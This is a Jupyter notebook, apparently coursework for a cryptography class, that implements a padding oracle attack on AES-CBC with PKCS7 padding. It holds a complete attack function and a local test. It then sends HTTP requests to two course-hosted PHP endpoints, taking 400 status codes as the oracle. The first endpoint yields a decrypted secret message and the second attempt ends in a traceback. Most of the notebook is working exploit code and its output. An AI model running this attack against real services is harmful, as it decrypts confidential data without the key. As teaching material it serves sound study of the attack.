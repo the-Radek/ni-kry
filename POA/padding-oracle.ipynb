{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Padding Oracle Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "from fake_vulnerable_server import decrypt_and_check, correct_ct, correct_pt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "BLOCK_SIZE = 16"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def xor(x, y):\n",
    "    return bytes([a ^ b for a, b in zip(x, y)])\n",
    "\n",
    "\n",
    "def attack(ciphertext, is_padding_ok):\n",
    "    # assert len(ciphertext) % BLOCK_SIZE == 0\n",
    "    blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]\n",
    "    plaintext = b''\n",
    "\n",
    "    for j, (prev_block, block) in enumerate(zip(blocks[:-1], blocks[1:])):\n",
    "        # x is intermediate block (after decryption)\n",
    "        x = b'\\xff' * BLOCK_SIZE\n",
    "        # n is padding length\n",
    "        n = 1\n",
    "        while n < BLOCK_SIZE+1:\n",
    "            i = BLOCK_SIZE - n\n",
    "            # Try all possible values starting from 0 or last ok value\n",
    "            start = x[i]+1 & 0xff\n",
    "            for k in range(start, 256):\n",
    "                x = x[:i] + bytes([k]) + x[i+1:]\n",
    "                padding = bytes([n]*n)\n",
    "                ct = prev_block[:i] + xor(x[i:], padding) + block\n",
    "                if is_padding_ok(ct):\n",
    "                    break\n",
    "            else:\n",
    "                x = x[:i] + b'\\xff' + x[i+1:]\n",
    "                n -= 1\n",
    "                if n < 1:\n",
    "                    raise ValueError(f'Padding attack failed in block {j}')\n",
    "                continue\n",
    "            n += 1\n",
    "        plaintext += xor(prev_block, x)\n",
    "\n",
    "    # Get actual length from padding bytes\n",
    "    length = len(plaintext) - plaintext[-1]\n",
    "    # Get actual length (alternative way)\n",
    "    for i in range(len(ciphertext) - 2*BLOCK_SIZE, len(ciphertext) - BLOCK_SIZE):\n",
    "        ct = ciphertext[:i] + bytes([~ciphertext[i] & 0xff]) + ciphertext[i+1:]\n",
    "        if not is_padding_ok(ct):\n",
    "            length = i\n",
    "            break\n",
    "\n",
    "    return plaintext[:length]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attack result: b'This must match whatever was decrypted, otherwise I throw an error.'\n",
      "Attack was successful: True\n"
     ]
    }
   ],
   "source": [
    "is_padding_ok = lambda ct: decrypt_and_check(ct) != 400\n",
    "plaintext = attack(correct_ct, is_padding_ok)\n",
    "\n",
    "print(\"Attack result:\", plaintext)\n",
    "print(\"Attack was successful:\", plaintext == correct_pt)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack on server 1\n",
    "\n",
    "The webpage at http://kib4.fit.cvut.cz/kry/padding/paddingoracle1.php accepts encrypted commands. Discover the secret message that was sent in the URL in the msg parameter. (3 points)\n",
    "\n",
    "Captured communication with the server: A user was connecting to url...\n",
    "\n",
    "and received the response (200), that the command was accepted. From secret sources we got the information that the server is written poorly and serves as a apdding oracle, which returns different error messages; for decryption and padding errors it returns 400 Bad Request, while for invalid but successfully decrytped commands it returns 404 Invalid Command. Your task is to discover the command the user sent. Encryption is done using AES in CBC mode, padding is according to PKCS7.\n",
    "\n",
    "NB. If your program dislikes the error codes returned (like Mathematica), use this modified url: …​ bucekj/kry/padding2/paddingoracle1.php"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://kib4.fit.cvut.cz/kry/padding/paddingoracle1.php?msg=46372b591f8ac5b77ead130e6e70663864976c7d2bb5d00459eb88ed74b00b7674c94624673cf0d682d329e98feedfc86b4cb2e66e8566667769d776e0cefa56ebbe827ebb417ce2f33ec100e63b98aba72b6f40e67a53df2b959048c7c1250feeda602252bbd4afd706567d48fea15e4d3d17af1f90f233b21e92917bd20f33\"\n",
    "url_prefix = url[:url.index(\"msg=\")+4]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_status_code(url):\n",
    "    response = requests.get(url)\n",
    "    return response.status_code\n",
    "\n",
    "def server_padding_ok(url_prefix):\n",
    "    return lambda ct: get_status_code(url_prefix + ct.hex()) != 400"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attack result: b'To prevent this attack, one could append a HMAC to the ciphertext.fb65d9e8d47470300aa3425f8f49fbf23e8b28c5'\n"
     ]
    }
   ],
   "source": [
    "ciphertext = bytes.fromhex(url[len(url_prefix):])\n",
    "plaintext = attack(ciphertext, server_padding_ok(url_prefix))\n",
    "\n",
    "print(\"Attack result:\", plaintext)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack on server 2\n",
    "\n",
    "Different servce, different parameters. Discover the secret message. (2 points)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "url2 = \"http://kib4.fit.cvut.cz/kry/padding/paddingoracle2.php?msg=c6decc82433e66c31c4b11eb3f45b74514579c9eb7c22717b66f7357aca6aa78d491d73d7d5fc437c18e4b84afe0fbf5495723e52481246112623f3a25381b8b2639ec765b5a5f0a73c79515e77a6d03dd7d15594bd58c15efc4b979c6d6f56a64e4edc781f296fe7986411cc8857315b14d84cedefceafdf2a0065039a1903d03bb60b5fb159bf3\"\n",
    "url_prefix2 = url2[:url2.index(\"msg=\")+4]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "ename": "ValueError",
     "evalue": "Padding attack failed in block 0",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mValueError\u001b[0m                                Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[20], line 2\u001b[0m\n\u001b[0;32m      1\u001b[0m ciphertext2 \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mbytes\u001b[39m\u001b[38;5;241m.\u001b[39mfromhex(url2[\u001b[38;5;28mlen\u001b[39m(url_prefix2):])\n\u001b[1;32m----> 2\u001b[0m plaintext2 \u001b[38;5;241m=\u001b[39m \u001b[43mattack\u001b[49m\u001b[43m(\u001b[49m\u001b[43mciphertext2\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mserver_padding_ok\u001b[49m\u001b[43m(\u001b[49m\u001b[43murl_prefix2\u001b[49m\u001b[43m)\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m      4\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mAttack result:\u001b[39m\u001b[38;5;124m\"\u001b[39m, plaintext2)\n",
      "Cell \u001b[1;32mIn[19], line 29\u001b[0m, in \u001b[0;36mattack\u001b[1;34m(ciphertext, is_padding_ok)\u001b[0m\n\u001b[0;32m     27\u001b[0m     n \u001b[38;5;241m-\u001b[39m\u001b[38;5;241m=\u001b[39m \u001b[38;5;241m1\u001b[39m\n\u001b[0;32m     28\u001b[0m     \u001b[38;5;28;01mif\u001b[39;00m n \u001b[38;5;241m<\u001b[39m \u001b[38;5;241m1\u001b[39m:\n\u001b[1;32m---> 29\u001b[0m         \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mValueError\u001b[39;00m(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mPadding attack failed in block \u001b[39m\u001b[38;5;132;01m%d\u001b[39;00m\u001b[38;5;124m'\u001b[39m \u001b[38;5;241m%\u001b[39m j)\n\u001b[0;32m     30\u001b[0m     \u001b[38;5;28;01mcontinue\u001b[39;00m\n\u001b[0;32m     31\u001b[0m n \u001b[38;5;241m+\u001b[39m\u001b[38;5;241m=\u001b[39m \u001b[38;5;241m1\u001b[39m\n",
      "\u001b[1;31mValueError\u001b[0m: Padding attack failed in block 0"
     ]
    }
   ],
   "source": [
    "ciphertext2 = bytes.fromhex(url2[len(url_prefix2):])\n",
    "plaintext2 = attack(ciphertext2, server_padding_ok(url_prefix2))\n",
    "\n",
    "print(\"Attack result:\", plaintext2)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
